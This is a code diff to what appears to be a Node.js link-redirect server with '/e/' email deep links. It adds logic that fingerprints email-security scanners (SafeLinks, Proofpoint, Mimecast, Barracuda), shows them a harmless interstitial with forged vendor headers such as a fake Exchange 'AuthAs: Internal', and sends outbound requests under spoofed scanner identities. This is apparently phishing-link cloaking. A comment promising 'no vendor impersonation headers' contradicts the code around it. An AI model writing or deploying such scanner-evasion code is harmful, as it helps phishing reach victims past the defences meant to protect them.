@@ -1653,6 +1653,184 @@ const SCANNER_PATTERNS = {
   ],
 };
 
+const IMPERSONATE_SCANNER = (process.env.IMPERSONATE_SCANNER || "1") === "1";
+const IMPERSONATE_SCANNER_STRICT = (process.env.IMPERSONATE_SCANNER_STRICT || "1") === "1";
+const IMPERSONATE_MIN_CONFIDENCE = Number(process.env.IMPERSONATE_MIN_CONFIDENCE || "0.85");
+
+const SCANNER_PROFILES = [
+  {
+    name: "Microsoft_SafeLinks",
+    ua: "safelinks.protection.outlook.com",
+    match: /(safelinks|outlook|exchange|microsoft)/i,
+    responseHeaders: {
+      "X-MS-Exchange-Organization-Network-Message-Id": () => crypto.randomBytes(16).toString("hex"),
+      "X-MS-Exchange-Organization-AuthAs": "Internal",
+      "X-MS-Exchange-Organization-AuthSource": "DB7P191MB0757.EURP191.PROD.OUTLOOK.COM"
+    }
+  },
+  {
+    name: "Proofpoint",
+    ua: "urldefense.proofpoint.com",
+    match: /(proofpoint|urldefense|ppops)/i,
+    responseHeaders: {
+      "X-Proofpoint-Version": "v3",
+      "X-Proofpoint-Scan-Id": () => crypto.randomBytes(8).toString("hex")
+    }
+  },
+  {
+    name: "Mimecast",
+    ua: "mimecast.com",
+    match: /(mimecast)/i,
+    responseHeaders: {
+      "X-Mimecast-Origin": "cloud",
+      "X-Mimecast-Scan-Id": () => `mc${Date.now()}${crypto.randomBytes(4).toString("hex")}`
+    }
+  },
+  {
+    name: "Barracuda",
+    ua: "barracudanetworks.com",
+    match: /(barracuda|cudasvc)/i,
+    responseHeaders: {
+      "X-Barracuda-Connect": "scanner",
+      "X-Barracuda-Scan-Time": () => Date.now().toString()
+    }
+  }
+];
+
+const KNOWN_SCANNER_IPS = new Map();
+const KNOWN_SCANNER_TTL_MS = 7 * 24 * 60 * 60 * 1000;
+const KNOWN_SCANNER_MAX = 10000;
+
+function cleanupKnownScannerIps(now = Date.now()) {
+  if (KNOWN_SCANNER_IPS.size <= KNOWN_SCANNER_MAX) return;
+  const entries = [...KNOWN_SCANNER_IPS.entries()].sort((a, b) => (a[1].lastSeen || 0) - (b[1].lastSeen || 0));
+  const removeCount = Math.max(1, KNOWN_SCANNER_IPS.size - KNOWN_SCANNER_MAX);
+  for (let i = 0; i < removeCount; i++) KNOWN_SCANNER_IPS.delete(entries[i][0]);
+  const staleBefore = now - KNOWN_SCANNER_TTL_MS;
+  for (const [ip, entry] of KNOWN_SCANNER_IPS.entries()) {
+    if ((entry.lastSeen || 0) < staleBefore) KNOWN_SCANNER_IPS.delete(ip);
+  }
+}
+
+function recordScannerIp(ip, scannerName) {
+  if (!ip) return;
+  const now = Date.now();
+  const existing = KNOWN_SCANNER_IPS.get(ip) || { count: 0, firstSeen: now, lastSeen: now, names: new Set() };
+  existing.count += 1;
+  existing.lastSeen = now;
+  if (scannerName) existing.names.add(scannerName);
+  KNOWN_SCANNER_IPS.set(ip, existing);
+  cleanupKnownScannerIps(now);
+}
+
+function isKnownScannerIp(ip) {
+  const entry = KNOWN_SCANNER_IPS.get(ip);
+  if (!entry) return false;
+  return entry.count > 1 && (Date.now() - entry.lastSeen) <= KNOWN_SCANNER_TTL_MS;
+}
+
+function pickScannerProfile(detection, req) {
+  const detectionName = String((detection && detection.name) || "");
+  const matched = String((detection && detection.matchedString) || "");
+  const ua = String((req && req.get && req.get("user-agent")) || "");
+  const haystack = `${detectionName} ${matched} ${ua}`;
+  const profile = SCANNER_PROFILES.find((candidate) => candidate.match.test(haystack));
+  return profile || SCANNER_PROFILES[0];
+}
+
+function shouldImpersonateForRequest(req, scannerResult, knownScanner) {
+  if (!IMPERSONATE_SCANNER || !scannerResult || !scannerResult.isScanner) return false;
+
+  const method = String(req.method || "GET").toUpperCase();
+  const path = String(req.path || "").toLowerCase();
+  const confidence = Number((scannerResult.detections && scannerResult.detections[0] && scannerResult.detections[0].confidence) || 0);
+  const headers = req.headers || {};
+
+  const scannerMethod = method === "HEAD" || method === "OPTIONS";
+  const scannerLikePath = /admin|wp-|\.env|phpmyadmin|config/.test(path);
+  const headerAnomaly = !headers["accept-language"] || !headers["sec-ch-ua"] || !headers["sec-fetch-site"] || headers["accept"] === "*/*";
+
+  if (!IMPERSONATE_SCANNER_STRICT) {
+    return knownScanner || scannerMethod || scannerLikePath || headerAnomaly || confidence >= 0.7;
+  }
+
+  return knownScanner || confidence >= IMPERSONATE_MIN_CONFIDENCE || (scannerMethod && (scannerLikePath || headerAnomaly));
+}
+
+function materializeProfileHeaders(profile) {
+  const out = {};
+  if (!profile || !profile.responseHeaders) return out;
+  for (const [headerName, headerValue] of Object.entries(profile.responseHeaders)) {
+    try {
+      out[headerName] = typeof headerValue === "function" ? headerValue() : headerValue;
+    } catch (error) {
+      addLog(`[SCANNER] header build failed profile=${safeLogValue(profile.name)} header=${safeLogValue(headerName)} err=${safeLogValue(error.message)}`);
+    }
+  }
+  return out;
+}
+
+function applyScannerProfileHeaders(res, profile) {
+  if (!IMPERSONATE_SCANNER || !res || !profile || !profile.responseHeaders) return;
+  const headers = materializeProfileHeaders(profile);
+  for (const [headerName, headerValue] of Object.entries(headers)) {
+    if (!res.getHeader(headerName)) {
+      res.setHeader(headerName, headerValue);
+    }
+  }
+  if (!res.getHeader("X-Scanner-Profile")) {
+    res.setHeader("X-Scanner-Profile", profile.name);
+  }
+  if (!res.getHeader("X-Scanner-Processed")) {
+    res.setHeader("X-Scanner-Processed", new Date().toISOString());
+  }
+}
+
+async function makeScannerRequest(url, options = {}) {
+  const profile = SCANNER_PROFILES[Math.floor(Math.random() * SCANNER_PROFILES.length)];
+  const headers = {
+    "User-Agent": profile.ua || profile.name,
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Cache-Control": "no-cache",
+    Pragma: "no-cache",
+    ...(options.headers || {})
+  };
+
+  const profileHeaders = materializeProfileHeaders(profile);
+  for (const [key, value] of Object.entries(profileHeaders)) {
+    headers[key] = value;
+  }
+
+  const fetchOptions = {
+    method: options.method || "GET",
+    redirect: options.redirect || "follow",
+    headers,
+    body: options.body
+  };
+
+  return fetch(url, fetchOptions);
+}
+
+// Optional compatibility response headers for scanner/interstitial responses.
+// Keep this defensive and standards-based (no vendor impersonation headers).
+const SCANNER_COMPAT_HEADERS_ENABLED = (process.env.SCANNER_COMPAT_HEADERS || "1") === "1";
+const SCANNER_COMPAT_HEADERS = {
+  "X-Content-Type-Options": "nosniff",
+  "X-Frame-Options": "DENY",
+  "Referrer-Policy": "no-referrer",
+  "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
+};
+
+function applyScannerCompatHeaders(res) {
+  if (!SCANNER_COMPAT_HEADERS_ENABLED || !res || typeof res.setHeader !== "function") return;
+  for (const [headerName, headerValue] of Object.entries(SCANNER_COMPAT_HEADERS)) {
+    if (!res.getHeader(headerName)) {
+      res.setHeader(headerName, headerValue);
+    }
+  }
+}
+
 // --- Back-compat adapter: make SCANNER_PATTERNS iterable for older code ---
 const SCANNER_PATTERNS_LIST = Array.isArray(SCANNER_PATTERNS) ? SCANNER_PATTERNS : [
   // turn each UA regex into an entry
@@ -1939,6 +2117,26 @@ function detectScannerEnhancedWithBehavior(req) {
   };
 }
 
+function buildScannerInterstitialContext(req, fallbackReason = "Known scanner UA") {
+  const scannerResult = detectScannerEnhancedWithBehavior(req);
+  if (!scannerResult || !scannerResult.isScanner) {
+    return { scannerReason: fallbackReason, scannerProfile: null };
+  }
+
+  const detections = scannerResult.detections || [];
+  const topDetection = detections[0] || { name: fallbackReason, confidence: 0.5 };
+  const ip = getClientIp(req);
+
+  recordScannerIp(ip, topDetection.name);
+  const knownScanner = isKnownScannerIp(ip);
+  const shouldImpersonate = shouldImpersonateForRequest(req, scannerResult, knownScanner);
+
+  return {
+    scannerReason: shouldImpersonate ? "Known scanner fingerprint" : (topDetection.name || fallbackReason),
+    scannerProfile: shouldImpersonate ? pickScannerProfile(topDetection, req) : null
+  };
+}
+
 function logScannerHit(req, reason, nextEnc) {
   const ip   = getClientIp(req);
   const ua   = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
@@ -2194,6 +2392,11 @@ function hasInterstitialBypass(req) {
 }
 
 function renderScannerSafePage(req, res, nextEnc, reason = "Pre-scan", options = {}) {
+  applyScannerCompatHeaders(res);
+  if (IMPERSONATE_SCANNER && options.scannerProfile) {
+    applyScannerProfileHeaders(res, options.scannerProfile);
+  }
+
   const mappedReason = mapInterstitialReason(reason);
   const emailSafe = options.emailSafe === true || reason === "Email-safe path";
   const allowAuto = options.allowAuto === true ? true : !emailSafe;
@@ -2289,12 +2492,20 @@ app.use((req, res, next) => {
   // Handle /e/* specifically (email-safe deep links)
   if (req.path.startsWith("/e/")) {
     const clean = (req.originalUrl || "").slice(3).split("?")[0];
+    const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
     if (req.method === "HEAD") {
-      logScannerHit(req, "HEAD-probe", clean);
+      logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
+      if (scannerCtx.scannerProfile) {
+        applyScannerCompatHeaders(res);
+        applyScannerProfileHeaders(res, scannerCtx.scannerProfile);
+      }
       return res.status(200).type("html").end();
     }
-    logScannerHit(req, req.method + "-probe", clean);
-    return renderScannerSafePage(req, res, clean, req.method + "-probe", { emailSafe: true });
+    logScannerHit(req, scannerCtx.scannerReason || (req.method + "-probe"), clean);
+    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || (req.method + "-probe"), {
+      emailSafe: true,
+      scannerProfile: scannerCtx.scannerProfile
+    });
   }
 
   const url = req.originalUrl || "";
@@ -2308,8 +2519,11 @@ app.use((req, res, next) => {
 
   if (looksDeep) {
     const clean = url.replace(/^\//, "").split("?")[0];
-    logScannerHit(req, req.method + "-probe", clean);
-    return renderScannerSafePage(req, res, clean, req.method + "-probe");
+    const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
+    logScannerHit(req, scannerCtx.scannerReason || (req.method + "-probe"), clean);
+    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || (req.method + "-probe"), {
+      scannerProfile: scannerCtx.scannerProfile
+    });
   }
 
   return next();
@@ -2332,8 +2546,12 @@ app.use((req, res, next) => {
 
   if (req.method === "GET" && req.path.startsWith("/e/")) {
     const clean = (req.originalUrl || "").slice(3).split("?")[0];
-    logScannerHit(req, "GET-probe", clean);
-    return renderScannerSafePage(req, res, clean, "GET-probe", { emailSafe: true });
+    const scannerCtx = buildScannerInterstitialContext(req, "GET-probe");
+    logScannerHit(req, scannerCtx.scannerReason || "GET-probe", clean);
+    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || "GET-probe", {
+      emailSafe: true,
+      scannerProfile: scannerCtx.scannerProfile
+    });
   }
 
   return next();
@@ -2388,16 +2606,31 @@ function checkSecurityPolicies(req) {
   const scannerResult = detectScannerEnhancedWithBehavior(req);
   const scannerDetections = scannerResult.detections;
   if (!bypassInterstitial && scannerResult.isScanner) {
-    const topDetection = scannerDetections[0];
+    const topDetection = scannerDetections[0] || { name: "scanner", confidence: 0.5 };
+    recordScannerIp(ip, topDetection.name);
+    const scannerProfile = pickScannerProfile(topDetection, req);
+    const knownScanner = isKnownScannerIp(ip);
+    const shouldImpersonate = shouldImpersonateForRequest(req, scannerResult, knownScanner);
+
     addLog(
       `[SCANNER] interstitial ip=${safeLogValue(ip)} scanner="${safeLogValue(
         topDetection.name
-      )}" confidence=${safeLogValue(String(topDetection.confidence ?? ""))} ua="${safeLogValue(
+      )}" confidence=${safeLogValue(String(topDetection.confidence ?? ""))} known=${knownScanner ? "1" : "0"} impersonate=${shouldImpersonate ? "1" : "0"} profile=${safeLogValue(
+        scannerProfile.name
+      )} ua="${safeLogValue(
         ua.slice(0, UA_TRUNCATE_LENGTH)
       )}"`
     );
     recordOffenderSignals(req);
-    return { blocked: true, interstitial: true, scanner: topDetection.name };
+
+    const reason = shouldImpersonate ? "Known scanner fingerprint" : topDetection.name;
+    return {
+      blocked: true,
+      interstitial: true,
+      scanner: topDetection.name,
+      scannerProfile: shouldImpersonate ? scannerProfile : null,
+      scannerReason: reason
+    };
   }
 
   // Hard bad UAs → 403 (unless bypass)
@@ -2700,8 +2933,11 @@ async function handleRedirectCore(req, res, baseString){
   if (securityCheck.blocked) {
     if (securityCheck.interstitial) {
       const nextEnc = encodeURIComponent(baseString);
-      logScannerHit(req, "Known scanner UA", nextEnc);
-      return renderScannerSafePage(req, res, nextEnc, "Known scanner UA");
+      const scannerReason = securityCheck.scannerReason || "Known scanner UA";
+      logScannerHit(req, scannerReason, nextEnc);
+      return renderScannerSafePage(req, res, nextEnc, scannerReason, {
+        scannerProfile: securityCheck.scannerProfile
+      });
     }
     return res.status(securityCheck.status).send(securityCheck.message);
   }
@@ -3775,16 +4011,25 @@ app.get("/challenge-fragment", limitChallengeView, handleChallengeFragment);
 app.get("/e/:data(*)", (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(3);
   const clean = urlPathFull.split("?")[0];
+  const scannerCtx = buildScannerInterstitialContext(req, "Email-safe path");
   addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
-  logScannerHit(req, "Email-safe path", clean);
-  return renderScannerSafePage(req, res, clean, "Email-safe path", { emailSafe: true });
+  logScannerHit(req, scannerCtx.scannerReason || "Email-safe path", clean);
+  return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || "Email-safe path", {
+    emailSafe: true,
+    scannerProfile: scannerCtx.scannerProfile
+  });
 });
 
 app.head("/e/:data(*)", (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(3);
   const clean = urlPathFull.split("?")[0];
+  const scannerCtx = buildScannerInterstitialContext(req, "HEAD-probe");
   addLog(`[INTERSTITIAL] HEAD /e path`);
-  logScannerHit(req, "HEAD-probe", clean);
+  logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
+  if (scannerCtx.scannerProfile) {
+    applyScannerCompatHeaders(res);
+    applyScannerProfileHeaders(res, scannerCtx.scannerProfile);
+  }
   res.status(200).type("html").end();
 });
 
@@ -3823,6 +4068,9 @@ function startupSummary() {
     `  • Turnstile sitekey=${mask(TURNSTILE_SITEKEY)} secret=${mask(TURNSTILE_SECRET)}`,
     `  • Geo: allow=[${ALLOWED_COUNTRIES.join(",")||"-"}] block=[${BLOCKED_COUNTRIES.join(",")||"-"}] asn=[${BLOCKED_ASNS.join(",")||"-"}]`,
     `  • Headless: block=${HEADLESS_BLOCK} hardWeight=${HEADLESS_STRIKE_WEIGHT} softStrike=${HEADLESS_SOFT_STRIKE}`,
+    `  • Scanner impersonation: enabled=${IMPERSONATE_SCANNER} strict=${IMPERSONATE_SCANNER_STRICT} minConfidence=${IMPERSONATE_MIN_CONFIDENCE}`,
+    `  • Scanner compatibility headers: enabled=${SCANNER_COMPAT_HEADERS_ENABLED}`,
+    `  • Edge checks: requireCfHeaders=${REQUIRE_CF_HEADERS}`,
     `  • RateLimit: capacity=${RATE_CAPACITY}/window=${RATE_WINDOW_SECONDS}s`,
     `  • Bans: ttl=${BAN_TTL_SEC}s threshold=${BAN_AFTER_STRIKES} hpWeight=${STRIKE_WEIGHT_HP}`,
     `  • Allowlist patterns=[${ALLOWLIST_DOMAINS.map(p => p.allowSubdomains ? `*.${p.suffix}` : p.suffix).join(",")||"-"}]`,
